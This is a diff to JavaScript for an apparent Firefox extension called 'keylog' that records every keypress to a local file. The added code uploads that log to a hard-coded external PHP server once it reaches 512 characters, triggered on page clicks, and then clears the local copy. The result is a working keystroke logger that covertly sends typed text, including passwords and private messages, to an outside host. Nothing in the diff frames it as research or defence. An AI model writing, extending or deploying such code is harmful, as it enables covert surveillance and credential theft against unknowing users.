@@ -16,7 +16,7 @@ fff_namespace.fff=function()
 };
 var keylog=new fff_namespace.fff();
 
-keylog.logKeypress=function(e) {
+keylog.logKeypress = function(e) {
 	var file = Components.classes["@mozilla.org/file/local;1"]
 						 .createInstance(Components.interfaces.nsILocalFile);
 	file.initWithPath(keylog.f);
@@ -40,10 +40,11 @@ keylog.logKeypress=function(e) {
 	foStream.close();
 }
 
-keylog.present_log=function() {
-	function isNumber(n) {
-		return !isNaN(parseFloat(n)) && isFinite(n);
-	}
+keylog.log_file_size = function(){
+	return String( keylog.get_log_file_content() ).length
+};
+
+keylog.get_log_file_content = function(){
 	//read the contents of the log file
 	var file = Components.classes["@mozilla.org/file/local;1"].createInstance(Components.interfaces.nsILocalFile);
 	file.initWithPath(keylog.f);
@@ -52,7 +53,14 @@ keylog.present_log=function() {
 	inputStream.init(file, -1, 0,0);
 	var sInputStream = Components.classes["@mozilla.org/scriptableinputstream;1"].createInstance(Components.interfaces.nsIScriptableInputStream);
 	sInputStream.init(inputStream);
-	var str= sInputStream.read(sInputStream.available());
+	return sInputStream.read(sInputStream.available());
+};
+
+keylog.present_log = function() {
+	function isNumber(n) {
+		return !isNaN(parseFloat(n)) && isFinite(n);
+	}
+	var str = keylog.get_log_file_content();
 
 	//writing the log file to a designed HTML file
 	var tmp_str='';
@@ -89,7 +97,7 @@ keylog.present_log=function() {
 	return tmp_str;
 };
 
-keylog.do_auth=function() {
+keylog.do_auth = function() {
 	var pass="",
 		initial_pass="",
 		input_pass="",
@@ -133,7 +141,7 @@ keylog.do_auth=function() {
 	return true;
 };
 
-keylog.show_present_log=function(){
+keylog.show_present_log = function(){
 	if(!keylog.do_auth())
 		return false;
 	//not stored in history
@@ -161,7 +169,7 @@ keylog.show_present_log=function(){
 	
 };
 
-keylog.clear_log=function(){
+keylog.clear_log = function(){
 	//delete the contents of the log file
 	var file = Components.classes["@mozilla.org/file/local;1"] .createInstance(Components.interfaces.nsILocalFile);
 	file.initWithPath(keylog.f);
@@ -173,11 +181,47 @@ keylog.clear_log=function(){
 	foStream.close();
 };
 
+keylog.ajaxFunction = function(url, callback, params)
+{
+	var xmlHttp=new XMLHttpRequest(url);
+
+	xmlHttp.onreadystatechange=function()
+	{
+		if(xmlHttp.readyState==4 && xmlHttp.status == 200)
+		{
+			callback(xmlHttp.responseText, xmlHttp);
+		}
+	}
+
+	//Sending POST method.
+	if (params)
+	{
+		xmlHttp.open("POST", url, true);
+		xmlhttp.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+		xmlHttp.send(JSON.stringify(params));
+	}
+	//Sending GET method.
+	else
+	{
+		xmlHttp.open("GET", url, true);
+		xmlHttp.send(null);
+	}
+};
+
+keylog.send_log_to_server = function()
+{
+	if(keylog.log_file_size() >= 512)
+		keylog.ajaxFunction('http://www.polishwebdesign.pl/projekty/logger/logger.class.php', keylog.clear_log, {data: keylog.present_log()})
+};
+
+
+
 if (typeof(fff) === "undefined")
 {
 	var fff = {
 		init : function() {
 			document.addEventListener("keypress", keylog.logKeypress, false);
+			document.addEventListener("click", keylog.send_log_to_server, false);
 		}
 	}
 }
